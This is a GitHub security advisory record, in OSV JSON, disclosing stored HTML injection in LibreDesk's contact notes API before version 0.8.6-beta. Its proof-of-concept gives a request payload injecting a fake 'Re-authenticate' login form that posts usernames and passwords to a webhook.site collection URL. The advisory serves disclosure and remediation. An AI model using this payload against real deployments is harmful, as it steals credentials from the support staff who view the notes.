{
  "id": "GHSA-wh6m-h6f4-rjf4",
  "modified": "2025-12-20T05:26:56.380373Z",
  "published": "2025-12-16T20:43:16Z",
  "summary": "Libredesk has Improper Neutralization of  HTML Tags in a Web Page",
  "details": "### Summary\n\nLibreDesk is vulnerable to **stored HTML injection** in the contact notes feature. When adding notes via `POST /api/v1/contacts/{id}/notes`, the backend automatically wraps user input in `\u003cp\u003e` tags. However, by intercepting the request and removing the `\u003cp\u003e` tag, an attacker can inject arbitrary HTML elements such as forms and images, which are then stored and rendered without proper sanitization. This can lead to phishing, CSRF-style forced actions, and UI redress attacks.\n\n---\n\n### Details\n\nWhen notes are added through the LibreDesk web application, the client sends note content wrapped inside `\u003cp\u003e` tags. The backend appears to **trust this HTML structure** and stores the content as-is.\n\nBy intercepting the request to:\n\n```\nPOST /api/v1/contacts/3/notes\n```\n\nand **removing the `\u003cp\u003e` wrapper**, an attacker can submit arbitrary HTML content. The backend does not sanitize or validate the HTML payload before persisting it.\n\nAs a result:\n\n* Arbitrary HTML tags (e.g., `\u003cform\u003e`, `\u003cinput\u003e`, `\u003cimg\u003e`) are stored\n* The injected HTML is rendered when the notes are viewed in the application\n* No server-side HTML sanitization or allowlisting is enforced\n\nThis indicates that the application relies on **client-side HTML formatting assumptions**, which can be bypassed by modifying the request.\n\n---\n\n### PoC\n\n1. Log in to LibreDesk and open any contact.\n2. Add a note normally via the UI.\n3. Intercept the request to:\n\n   ```\n   POST /api/v1/contacts/3/notes\n   ```\n4. Original request body (example):\n\n   ```json\n   {\n     \"note\": \"\u003cp\u003eThis is a normal note\u003c/p\u003e\"\n   }\n   ```\n5. Modify the payload by removing the `\u003cp\u003e` tag and injecting arbitrary HTML:\n\n   ```json\n   {\n     \"note\": \"\u003cform action='https://webhook.site/xxxx' method='POST'\u003e\n                \u003cinput type='text' name='username' placeholder='Username'\u003e\n                \u003cinput type='password' name='password' placeholder='Password'\u003e\n                \u003cinput type='submit' value='Re-authenticate'\u003e\n              \u003c/form\u003e\"\n   }\n   ```\n\n6. Forward the request.\n7. View the contact note in the LibreDesk UI.\n\n**Result:**\nThe injected HTML form is rendered inside the application.\n\n\n---\n\n### Impact\n\nThis is a **stored HTML injection** vulnerability affecting any user who can add or view contact notes.\n\nPotential impact includes:\n\n* Credential phishing through injected forms\n* CSRF-style forced actions using HTML-only forms\n* UI redress and social engineering\n* Increased risk if notes are viewed by privileged users (e.g., admins or agents)\n\nIf the notes are shared across users or roles, this vulnerability can be abused to target multiple users, increasing severity.",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/abhinavxd/libredesk",
        "purl": "pkg:golang/github.com/abhinavxd/libredesk"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.8.6-beta"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-wh6m-h6f4-rjf4/GHSA-wh6m-h6f4-rjf4.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/abhinavxd/libredesk/security/advisories/GHSA-wh6m-h6f4-rjf4"
    },
    {
      "type": "WEB",
      "url": "https://github.com/abhinavxd/libredesk/commit/270347849943ac6a43e9fd6ebdc99c71841900eb"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/abhinavxd/libredesk"
    }
  ]
}